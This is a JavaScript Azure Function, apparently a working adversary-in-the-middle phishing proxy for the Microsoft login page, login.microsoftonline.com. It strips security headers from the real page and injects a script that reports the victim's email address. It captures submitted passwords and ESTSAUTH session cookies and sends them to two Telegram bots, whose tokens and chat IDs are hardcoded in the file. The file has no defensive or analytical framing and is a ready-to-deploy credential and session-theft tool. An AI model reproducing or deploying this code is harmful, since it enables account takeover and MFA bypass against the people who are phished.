const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const telegram_bot_token = "5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8";
const telegram_chat_id = "1412104349";
const telegram_bot_token_2 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_chat_id_2 = "6743632244";

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

const emailMap = new Map();

async function replace_response_text(response, upstream, original, ip) {
  return response.text().then((text) =>
    text
      .replace(new RegExp(upstream, "g"), original)
      .replace(
        "</body>",
        `<script>
          document.addEventListener('DOMContentLoaded', () => {
            const interval = setInterval(() => {
              const btn = document.getElementById("idSIButton9");
              const emailInput = document.querySelector("input[name='loginfmt']");
              if (btn && emailInput) {
                clearInterval(interval);
                const realIP = "${ip}";
                btn.addEventListener("click", () => {
                  fetch("/__notify_click", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: emailInput.value,
                      ip: realIP
                    }),
                  });
                });
              }
            }, 500);
          });
        </script></body>`
      )
  );
}

async function dispatchMessage(message) {
  const url1 = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage`;
  const url2 = `https://api.telegram.org/bot${telegram_bot_token_2}/sendMessage`;
  
  // Send to both Telegram bots
  await Promise.all([
    fetch(url1, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: telegram_chat_id, text: message, parse_mode: "HTML" }),
    }).catch((err) => console.error("Telegram bot 1 error:", err)),
    
    fetch(url2, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: telegram_chat_id_2, text: message, parse_mode: "HTML" }),
    }).catch((err) => console.error("Telegram bot 2 error:", err))
  ]);
}

module.exports = async function (context, req) {
  const ip =
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-client-ip"] ||
    req.headers["true-client-ip"] ||
    req.headers["x-real-ip"] ||
    "unknown";

  const upstream_url = new URL(req.url);
  const original_url = new URL(req.url);
  upstream_url.host = upstream;
  upstream_url.port = 443;
  upstream_url.protocol = "https:";

  if (upstream_url.pathname === "/") {
    upstream_url.pathname = upstream_path;
  } else {
    upstream_url.pathname = upstream_path + upstream_url.pathname;
  }

  context.log(`Proxying ${req.method}: ${original_url} → ${upstream_url}`);

  const new_request_headers = new Headers(req.headers);
  new_request_headers.set("Host", upstream_url.host);
  new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
  new_request_headers.set("user-agent", "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)");
  new_request_headers.set("Referer", original_url.protocol + "//" + original_url.host);

  // Handle special injected click reporting
  if (req.method === "POST" && original_url.pathname === "/__notify_click") {
    const body = JSON.parse(req.body);
    const email = body.email || "unknown";
    const realIP = body.ip || ip;
    emailMap.set(realIP, email);
    await dispatchMessage(
      `👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${realIP}`
    );
    return { status: 200, body: "ok" };
  }

  // Capture login credentials
  if (req.method === "POST") {
    const body = req.body;
    const keyValuePairs = body.split("&");

    const data = Object.fromEntries(
      keyValuePairs
        .map((pair) => {
          const [key, value] = pair.split("=");
          return [key, decodeURIComponent((value || "").replace(/\+/g, " "))];
        })
        .filter(([key]) => key === "loginfmt" || key === "passwd")
    );

    if (data.loginfmt) {
      emailMap.set(ip, data.loginfmt);
    }

    if (data.loginfmt && data.passwd) {
      await dispatchMessage(
        `📥 <b>Captured Credentials</b>:\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🔑 <b>Password</b>: ${data.passwd}\n🌐 <b>IP</b>: ${ip}`
      );
    }
  }

  const original_response = await fetch(upstream_url.href, {
    method: req.method,
    headers: new_request_headers,
    body: req.body,
    duplex: "half",
  });

  if (
    req.headers["Upgrade"] &&
    req.headers["Upgrade"].toLowerCase() === "websocket"
  ) {
    return { status: original_response.status, body: original_response.body };
  }

  const new_response_headers = new Headers(original_response.headers);
  delete_headers.forEach((h) => new_response_headers.delete(h));
  new_response_headers.set("access-control-allow-origin", "*");
  new_response_headers.set("access-control-allow-credentials", true);

  // Capture important cookies
  try {
    const originalCookies = original_response.headers.getSetCookie?.() || [];

    originalCookies.forEach((originalCookie) => {
      const modifiedCookie = originalCookie.replace(
        new RegExp(upstream_url.host, "g"),
        original_url.host
      );
      new_response_headers.append("Set-Cookie", modifiedCookie);
    });

    const importantCookies = originalCookies.filter((cookie) =>
      /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie|MSPOK)=/.test(cookie)
    );

    if (importantCookies.length >= 3) {
      const victimEmail = emailMap.get(ip) || "unknown";
      const cookieText = importantCookies.map((c) => c.split(";")[0]).join("\n");

      await dispatchMessage(
        `🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>:\n<code>${cookieText}</code>\n🌐 <b>IP</b>: ${ip}`
      );
    }
  } catch (err) {
    console.error("Cookie capture error:", err);
  }

  const modifiedBody = await replace_response_text(
    original_response.clone(),
    upstream_url.protocol + "//" + upstream_url.host,
    original_url.protocol + "//" + original_url.host,
    ip
  );

  return {
    status: original_response.status,
    headers: Object.fromEntries(new_response_headers.entries()),
    body: modifiedBody,
  };
};